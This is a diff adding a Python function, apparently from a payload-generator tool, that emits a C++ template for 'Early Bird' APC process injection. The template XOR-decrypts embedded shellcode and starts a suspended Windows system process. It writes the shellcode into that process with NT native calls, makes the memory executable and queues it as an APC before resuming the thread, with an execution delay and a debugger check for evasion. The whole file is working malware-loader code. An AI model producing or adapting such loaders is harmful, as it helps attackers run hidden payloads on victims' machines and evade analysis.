@@ -1,0 +1,60 @@
+def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key_var,key_hex):
+    EarlyBird_Injection=f"""
+    unsigned char {shellcode_var}[] = {ciphertext_split}
+
+            if (!executed)
+            {{
+
+                executed = TRUE;
+
+                LPVOID allocation_start;
+                SIZE_T allocation_size = sizeof({shellcode_var});
+                NTSTATUS status = NULL;
+
+                allocation_start = nullptr;
+
+                char {key_var}[] = "{key_hex}";
+
+                STARTUPINFOA si = {{ 0 }};
+                PROCESS_INFORMATION pi = {{ 0 }};
+
+                CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+                HANDLE victimProcess = pi.hProcess;
+                HANDLE threadHandle = pi.hThread;
+                //delay execution
+                timing_CreateWaitableTimer({time});
+
+                            /*++
+
+                    Routine Description:
+
+                        CheckRemoteDebuggerPresent() is another Win32 Debugging API function;
+                        it can be used to check if a remote process is being debugged. However,
+                        we can also use this as another method for checking if our own process
+                        is being debugged. This API internally calls the NTDLL export
+                        NtQueryInformationProcess function with the PROCESSINFOCLASS set to
+                        7 (ProcessDebugPort).
+
+                    Arguments:
+                        None
+                    Return Value:
+
+                        TRUE - if debugger was detected
+                        FALSE - otherwise
+                    --*/
+                BOOL bIsDbgPresent = FALSE;
+                DWORD oldProtect= NULL;
+                CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
+                // Allocate Virtual Memory 
+                NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                {xor_func}({shellcode_var}, sizeof({shellcode_var}), {key_var}, sizeof({key_var}));
+                // Copy shellcode into allocated memory
+                NtWriteVirtualMemory(victimProcess, allocation_start, {shellcode_var}, sizeof({shellcode_var}), 0);
+                NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);
+
+                NtQueueApcThread(threadHandle, PKNORMAL_ROUTINE(allocation_start), allocation_start, NULL, NULL);
+                NtResumeThread(threadHandle, NULL);
+                return 0;
+            }}
+    """
+    return EarlyBird_Injection
